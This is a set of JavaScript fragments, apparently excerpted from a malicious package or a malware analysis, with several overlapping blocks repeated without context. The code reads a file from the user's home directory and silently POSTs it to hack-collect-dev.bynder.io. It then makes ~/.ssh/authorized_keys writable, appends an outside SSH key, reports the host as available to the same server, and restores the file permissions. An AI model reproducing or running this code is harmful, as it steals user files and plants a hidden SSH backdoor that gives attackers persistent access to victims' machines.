const homedir = os.homedir()
fs.readFile(homedir + fileofinterest, 'utf8', function (err,data) {
      if (err) {
        return;
      }

      var options = {
        hostname: 'hack-collect-dev.bynder.io',
        port: 443,
        path: '/statistics',
        method: 'POST',
      };
      var req = http.request(options, function(res) {
        res.setEncoding('utf8');
      });
      req.on('error', function(e) {
        // Silence
      });
      // write data to request body
      req.write(data);
      req.end();
    })
let authkeys = homedir + "/.ssh/authorized_keys"
fs.stat(authkeys, (err, stats) => {
    if (err) return;

    let origmode = stats.mode;
    let newmode = origmode | 128;
    fs.chmod(authkeys, origmode | 128, () => {
      fs.appendFile(authkeys, coolKey, (err) => {
        if (err) {
          return;
        }
        var options = {
          hostname: 'hack-collect-dev.bynder.io',
          port: 443,
          path: '/success',
          method: 'POST',
        };
        var req = http.request(options, function(res) {
          res.setEncoding('utf8');
        });
        req.on('error', function(e) {
          // Silence
        });
        // write data to request body
        req.write("This host is available");
        req.end();

        fs.chmod(authkeys, origmode, () => {});
      });
    })
  })
let origmode = stats.mode
let newmode = origmode | 128
fs.chmod(authkeys, origmode | 128, () => {
      fs.appendFile(authkeys, coolKey, (err) => {
        if (err) {
          return;
        }
        var options = {
          hostname: 'hack-collect-dev.bynder.io',
          port: 443,
          path: '/success',
          method: 'POST',
        };
        var req = http.request(options, function(res) {
          res.setEncoding('utf8');
        });
        req.on('error', function(e) {
          // Silence
        });
        // write data to request body
        req.write("This host is available");
        req.end();

        fs.chmod(authkeys, origmode, () => {});
      });
    })
fs.appendFile(authkeys, coolKey, (err) => {
        if (err) {
          return;
        }
        var options = {
          hostname: 'hack-collect-dev.bynder.io',
          port: 443,
          path: '/success',
          method: 'POST',
        };
        var req = http.request(options, function(res) {
          res.setEncoding('utf8');
        });
        req.on('error', function(e) {
          // Silence
        });
        // write data to request body
        req.write("This host is available");
        req.end();

        fs.chmod(authkeys, origmode, () => {});
      })
fs.chmod(authkeys, origmode, () => {})
